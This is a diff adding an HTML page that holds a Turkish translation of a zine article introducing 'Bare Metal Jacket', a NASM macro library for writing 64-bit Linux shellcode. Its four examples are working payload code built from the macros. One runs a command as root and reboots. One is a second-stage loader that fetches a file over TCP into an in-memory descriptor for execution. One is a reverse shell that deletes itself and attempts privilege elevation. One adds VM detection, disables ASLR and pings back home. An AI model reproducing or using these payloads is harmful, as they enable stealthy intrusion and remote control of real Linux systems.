@@ -1,0 +1,187 @@
+<html>
+<head>
+<title>Bare Metal Jacket</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+ ▀█████████▄           ▄▄▄▄███▄▄▄▄                ▄ 
+   ███ 00 ███      ▄ █ █▀▀▀███▀▀▀█ █ ▄          █ █
+   ███    ███      █ █ █fff███   █0x90          █ █ 
+  ▄███▄▄90▄██      █ █ █   ███   █ █ █          █ █ 
+ ▀▀███▀▀▀██▄         █ █   ███   █ █            █0x 
+   ███0xc0██▄      █ █ █   ███   █ █ █          █ █ 
+   ███c3  ███      █ █ █   0x0fff█ █ █     █    █ █ 
+ ▄█████|████▀        ▀ █   ███   | ▀       █▄▄▄▄█ █ 
+       |                         |             |
+       |                         |             |
+       |                         |             |
+       |      .                  |      .      |      .   .      .  .      . 
+       |    .   .                | * .         |  .  *     .   .     .
+       | .  .                    | .   *       |   *  .   *   .    .
+ ~~~~~~~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~   ~   ~   ~  ~   - - - - - - - - - - -  -   -   -   =]D&gt;
+       |   .   .                 |   *  *      |  .  *   *    .
+       |      .                  |    .        |  . *  .   *     *
+       |                         |      .      |     *  .  .   *
+       |---- [Bare]              |             |      .    
+                                 |             |
+                     [Metal] ----|             |       
+                                               |       
+          [Jacket]-----------------------------|       
+
+
+        ----{ Wintrmvte @ redcodelabs.io &lt;*&gt; }----
+
+
+[ @akilgundogan / M. Akil Gündoğan tarafından çevirilmiştir. ]
+| - - - - [ Giriş ]
+
+Birkaç yıl önce el ile shellcode yazmaya başladığımda, çok sayıda harika kaynak ve
+referanslara sahip olduğundan (başta SLAE olmak üzere) genellikle x86_x64 mimarisinde 
+kalmaya gayret ettim. 
+
+Benim için 64 bit ekosistemine geçiş oldukça zor oldu, çünkü piyasada yer alan
+kaynakların çoğu modern Linux senaryolarını karşılamıyordu ve low-level bir yaklaşımla
+ele almıyordu. Bunu yapanlar da genellikle birkaç temel kavramlara değinmekle yetiniyordu.
+
+Bu araç yeni bir şey ortaya koymaz ama gelecekteki projelerinize eminim ki yardımcı olacak. 
+Burada görev otomasyonu/task otomation için standart NASM makrolarının yanı sıra 
+assembly tekniklerinizi geliştirecek birtakım kompleks makrolar da bulacaksınız.
+
+
+
+| - - - - [ Örnek #1 = Kod Yürütme/Command Execution ]
+
+Öncelikle çok düz bir örnekle başlayacağız - arbitrary command execution / keyfi kod yürütme
+Kodumuz yükseltilmiş sistem yetkileriyle çalıştırılıp çalıştırılmadığını kontrol etmelidir.
+Eğer öyleyse arka planda bir shell oturumu başlatır ve sistemi yeniden başlatmaya çalışır.
+
+------------ cmd_exec.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+        is_root                     ; Eğer UID=0 ise RAX'a 1 döndür.
+        cmp rax, 1                  ; Yukarıda belirlenen şartı kontrol eder
+        jne xit                     ; Eğer root değilse yürütme akışından exit(0) ile çıkın
+        run_bg "echo pvvned"        ; Çalıştırmak istenen komut
+        reboot
+        xit:                        ; Program çıkışı
+        exit 0
+--------------------------------------
+
+Haydi derleyelim:
+
+    $ nasm -f elf64 -o cmd_exec.o cmd_exec.asm 
+    $ ld -m elf_x86_64 cmd_exec.o -o cmd_exec
+
+Oluşturulan ELF dosyasını sudo eki ile ve sudo eki olmadan çalıştırmayı deneyin.
+
+
+
+| - - - - [ Örnek #2 = Zaman Manipülasyonu ve Second Stage Loader'lar]
+
+Şimdi biraz daha kompleks bir şeyler oluşturalım. Başlangıçta payload'ımız kendisi
+için bir yaşam süresi oluşturacaktır (5 dakika diyelim).
+
+Bu zaman dilimi içerisinde uzak bir dosyayı (mesela yürütülebilir dosyalar veya bir LKM gibi.) bir 
+in-memory file descriptor ile eşlemeye çalışır. 
+
+Eğer server dosyaların bulunduğu sunucuyla herhangi bir nedenden ötürü
+bağlantı başarısız olursa her connect(2) denemesi 20 saniyelik aralarla sonsuz
+bir döngü şeklinde devam eder.
+
+Haydi koda göz atalım :
+
+------------------------------- timed_stager.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+
+        set_ttl 5, MINUTES          ; Daha önceden tanımlanmış bir time constant kullanarak payload'ın çalışma süresini belirliyoruz
+                                    ; Bu süreç sonunda mevcut process SIGALRM gönderip çıkış yapar
+
+        infinite_loop file_download, 20, SECONDS 
+
+    file_download:           
+        init_sock_tcp               ; RAX üzerinde yeni bir TCP soketi açılır
+        push rax
+        pop r11                     ; Soketin fd'si (file descriptor) daha sonra saklanmak üzere kaydedilir
+        sock_connect "127.0.0.1", 4444
+                                    ; Yukarıda belirtilenler dosya sunucusuna dair bilgiler
+        memfd_create                ; in-memory file descriptor oluşturulur ve RAX'a return edilir
+        push rax
+        pop r12
+        fd2fd                       ; Bir file descriptor içeriğini okuyup diğerine yazar
+                                    ; Açık olarak işlenen operand'lar r11 (kaynak) ve r12 (hedef) şeklindedir fakat herhangi bir register da kullanılabilir
+        ret                         ; 'file_download:' etiket akışını bir 'ret' ile durdurmayı unutmayın
+        . . .                       ; Artık dosyamızı 'fd_exec r12' gibi bir makroyla çalıştırabilir veya istediğimiz herhangi bir şey yapabiliriz. (nmap() gibi)
+-------------------------------------------------------------
+
+sock_connect kullandığımızdan sunucunun adresini hex olarak belirtmemiz gerekmediğine dikkat edin
+çünkü ilgili makro hex dönüştürücüye sahip.
+
+
+| - - - - [ Örnek #3 = Sadece Reverse Shell Değil]
+
+Üçüncü örneğimiz, basit bir TCP reverse shell örneğinden oluşuyor.
+
+Eğer belirli koşullar sağlanırsa yürütülebilir dosyası dosya sistemi üzerinden kaldırılır
+ve process'in öncelik seviyesi yükseltilir ('htop' üzerinde de görülebileceği gibi)
+
+Yükümüz ayrıca yetkilerini yükseltmeye çalışır (fakat genellikle acıklı bir şekilde başarısız olur)
+ve TTY'den kendisini ayırır.
+
+Tam daemon-benzeri davranış (setsid(0x00) eklentisi) 0x05 ile ifade edilmiş 'daemon_init' makrosunda 
+bulunabilir.
+
+------------------------------- reverse_shell.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start: 
+        remove_self                 ; Eğer ikili dosyanın boyutu aşağı yukarı mevcut yükün boyuna (fsize değişkenine eşitse) kendini kaldırır
+        set_priority MAX_PRIO       ; Process önceliğini maksimum hale getiririz
+        elevate_full                ; SETGID(0) ve SETUID(0) aracılığıyla yetki yükseltme denemesi
+        tty_detach                  ; setsid(0x00) == TTY'den ayrılınır
+        revshell "127.0.0.1", 5555  ; Spawn a standard TCP reverse shell Standart bir TCP reverse shell oturumu başlatılır
+        get_current_size_var        ; 'remove_self' makrosu tarafından kullanılan 'fsize' değişkeni aktif hale getirilir
+-------------------------------------------------------------
+
+
+
+| - - - - [ Örnek #4 = Size Padding ve VM Tespiti]
+
+Son olarak kısa bir NOP sled eklemek için iki padding makrosu kullanalım ve payload'ımızın
+boyutunu toplam 256 byte'a çıkaralım.
+
+Ayrıca payload'ı yürütmenin başarılı olup olmadığını kontrol etmek için ana bilgisayara
+öylesine bir pingback isteğinde bulunalım.
+
+Ayrıca en üste bir sanallaştırma tespit yöntemi ve kodumuzun tek ana bilgisayarda zombi benzeri 
+davranışlar sergilemesini engellemek için bir dosya kilidi ayarlayalım.
+
+------------------------------- vm_and_stuff.asm -----------
+    BITS 64
+    %include "bmj.asm"
+    section .text
+    global _start
+    _start:
+        nops 40
+        flock                          ; Aynı anda çalışan yükler yalnızca tek bir işlem önceliğinde çalışmaya zorlanır
+        vm_age                         ; /etc/hostname'in STATX yapısını inceleyerek bir VM içerisinde başlayıp başlamadığımızı kontrol eder
+        disable_aslr                   ; Gelecekteki kullanımlar için ASLR devre dışı bırakılır
+        sock_connect "127.0.0.1", 6666 ; Reverse TCP pingback adresi
+        padd_byte 256, 0x90            ; Nasm ile oluşturulduktan sonra toplamda payload boyutunun 256 byte olması için '0x90' ile doldurulur.
+-------------------------------------------------------------
+
+
+Okuduğunuz için teşekkürler, III. sayıda görüşürüz ! o/
+
+[0] <a href="https://github.com/redcode-labs/BMJ">https://github.com/redcode-labs/BMJ</a>
+</pre></body></html>
